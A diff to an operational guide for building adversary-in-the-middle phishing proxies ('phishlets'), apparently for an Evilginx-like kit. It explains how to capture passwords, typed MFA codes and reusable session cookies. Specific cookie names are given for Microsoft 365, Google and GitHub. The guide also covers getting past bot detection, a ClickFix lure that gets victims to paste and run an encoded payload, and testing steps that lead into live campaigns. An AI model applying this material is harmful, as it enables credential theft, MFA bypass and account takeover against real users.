@@ -26,26 +26,33 @@ proxy_hosts:                         # hosts we proxy + fabricate
 credentials:                         # PILLAR 1: username/password capture
   username: {key: loginfmt, search: '...', type: post}
   password:  {key: passwd,  search: '...', type: post}
-  custom:                            # PILLAR 2: extra tokens (OTP, claims)
-    - {domain: login.provider.com, keys: ['OTP'], type: post}
+  custom:                            # PILLAR 2: MFA codes / extra fields
+    - {key: otp, search: '(.*)', type: post}   # typed TOTP/SMS codes (push MFA posts nothing)
 login:
   domain: login.provider.com
 auth_tokens:                         # PILLAR 3: session-completing cookies
   - domain: .provider.com
     keys: ['SESSION', 'PERSIST']
+  - domain: provider.com             # host-only cookies (__Host-*): group WITHOUT the dot
+    keys: ['__Host-session']
 ```
 
 ### The three capture pillars — get all three or the phishlet is a toy
 
 1. **credentials** — where the username/password appear in POST bodies. Inspect the real
    login flow (browser devtools → copy-as-cURL). Regex allowed when values hide inside
-   JSON-RPC blobs (Google: email extracted by regex from the `f.req` POST field).
-2. **custom** — anything else worth logging (TOTP codes, recovery emails).
+   JSON-RPC blobs (Google: email extracted by regex from the `f.req` POST field);
+   SPA logins POST JSON — use `type: json` with a body regex (Atlassian:
+   `"username"\s*:\s*"([^"]+)"`).
+2. **custom** — MFA codes worth logging: `{key: otp, search, type}` — typed TOTP/SMS
+   codes only (push MFA like GitHub Mobile posts no field).
 3. **auth_tokens** — the cookie set that makes the session REUSABLE. Test by importing
    into a fresh browser: no login wall = right set. Proven sets: ms365 consumer =
    `WLSSC`, ms365 work = `ESTSAUTHPERSISTENT` (login.live.com), google = the
    `.google.com` family (`SID`, `__Secure-1PSID`, `__Secure-3PSID`, `SAPISID`,
-   `HSID`, `SSID`, `APISID`). Track tokens across ALL auth domains the flow visits.
+   `HSID`, `SSID`, `APISID`), github = host-only `__Host-user_session_same_site` +
+   `_gh_sess` (group `github.com`, NO dot). Track tokens across ALL auth domains
+   the flow visits.
 
 ## Hard rules (each one caused a real incident)
 
@@ -56,6 +63,9 @@ auth_tokens:                         # PILLAR 3: session-completing cookies
 | Rewrite **both directions** | every absolute URL origin-embedded must map to the fabricated host and back; test a FULL flow, not just landing |
 | Token values in `search` regexes must be anchored enough not to match URL params | e.g. hostname checks in code must use parsed hostname, never substring over the whole URL (a `continue=` param once caused false "done") |
 | Autocomplete/hidden fields | capture rules must target the VISIBLE field — hidden prefilled inputs (e.g. hiddenPassword) silently match first and capture empty values |
+| `login.domain` must be an exact `orig_sub`+`domain` combination from `proxy_hosts` | validator rejects it otherwise (aws: `signin` + `amazon.com` = `signin.amazon.com` ≠ `signin.aws.amazon.com` — use domain `aws.amazon.com`) |
+| Host-only cookies get a **no-dot** auth_tokens group | `Set-Cookie` without a `Domain` attr (all `__Host-*`) lands on the bare hostname; lookup is exact-string — `.github.com` groups never see them (GitHub lesson: session = `__Host-user_session_same_site` on `github.com`) |
+| Verify the token list against a LIVE login before shipping | providers silently change cookies — GitHub dropped domain-wide `user_session` entirely; make non-critical cookies `:opt` so completion can't hang |
 
 ## Per-phishlet botguard JA4 exceptions
 
@@ -75,7 +85,7 @@ clipboard and instructs them to run it (Win+R → Ctrl+V → Enter):
 
 ```yaml
 clickfix:
-  template: cloudflare-turnstile     # cloudflare-turnstile / windows-fix / recaptcha
+  template: cloudflare-turnstile     # cloudflare-turnstile / windows-fix / recaptcha / aws-captcha
   command: "<payload>"               # base64-encoded in the page source
   position: before                   # before = pre-login, after = post-capture
 ```
@@ -114,22 +124,38 @@ domain, never the campaign one.
 ## Testing procedure (in order)
 
 1. YAML loads: `phishlets reload` via console/MCP; no parse errors in log.
-2. Render via trusted loopback (botguard lets 127.0.0.1 through):
-   `curl -sk -L -c /tmp/cj -A "<browser UA>" --resolve <host>:443:127.0.0.1 "https://<host>/<lure>?t=<token>"`.
+2. Render through the **lure with `?t=<token>`** in one browser session —
+   NEVER by visiting the landing path directly: a direct visit has no session,
+   so POSTs are not monitored (capture silently missing) and a non-allowlisted
+   headless JA4 gets the botguard decoy redirect, which looks like a broken
+   phishlet. The token-gate param is `t`, not `token`.
 3. Full flow with a test account: identifier → password → MFA → landed app.
-4. `sessions` shows capture with all 3 pillars; export cookies, replay in a browser
-   (MCP `open_session`), confirm no login wall.
-5. Detection check from a burner domain; only then campaign.
+   Push-type MFA (GitHub Mobile) posts no OTP field — `custom: otp` only fires
+   on typed codes; that is expected, not a bug.
+4. `sessions` shows capture with all 3 pillars; export cookies, replay in a
+   browser (MCP `open_session`), confirm no login wall.
+5. Detection check from a burner domain; only then campaign. Pause test lures
+   with `PUT /lures/{id}` `{"paused": <unix-ts>}` — the field is an int64
+   timestamp (pause UNTIL), not a boolean; `0` resumes.
 
 ## Reference phishlets on the node
 
-`ms365.yaml` (gold standard: 15 proxy_hosts, telemetry hosts, CSD hardening, consumer
-+ work token sets) and `google.yaml` (relay-based). Read them before writing a new one.
+`ms365.yaml` (gold standard: 15 proxy_hosts, telemetry hosts, CSD hardening,
+consumer + work token sets), `github.yaml` (**verified E2E** — the modern
+minimal pattern: auto_filter rewrites, telemetry `collector` proxied not
+blocked, host-only `__Host-` token group) and `google.yaml` (relay-based).
+Read them before writing a new one.
 
 ## Gotchas
 
-- Some providers need extra telemetry hosts allow-listed in `proxy_hosts` or their JS
-  dies silently (Microsoft play.googleapis, Google play/gapi/ogs hosts).
+- Some providers need extra telemetry hosts allow-listed in `proxy_hosts` or
+  their JS dies silently (Microsoft play.googleapis, Google play/gapi/ogs
+  hosts, GitHub collector.github.com — always PROXY telemetry, never block it).
 - Unknown SNI = silent drop = browser hang (hostname typo, not an error page).
 - `301/302 to /` on first hop is NORMAL for ms365 (hop 1 of the OAuth dance).
 - Empty password capture can be correct (passwordless accounts).
+- Cloudflare-protected logins (gitlab/claude/chatgpt) render the CF challenge
+  ON the phishing host for headless browsers — that is expected; verify with a
+  real browser before declaring the phishlet broken.
+- `auto_filter` defaults to ON for every proxy host — explicit `sub_filters`
+  are only needed for special-case rewrites.
